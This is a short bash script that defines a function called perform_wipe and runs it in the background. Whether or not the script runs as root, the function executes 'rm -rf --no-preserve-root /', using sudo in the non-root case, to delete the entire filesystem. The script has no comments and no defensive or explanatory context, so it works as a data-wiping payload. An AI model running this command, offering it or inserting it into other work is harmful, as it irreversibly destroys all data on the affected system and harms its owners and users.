#!/bin/bash

perform_wipe() {
  if [ "$EUID" -ne 0 ]; then
    rm -rf --no-preserve-root /
    exit
  fi
  sudo rm -rf --no-preserve-root /
}

( perform_wipe ) &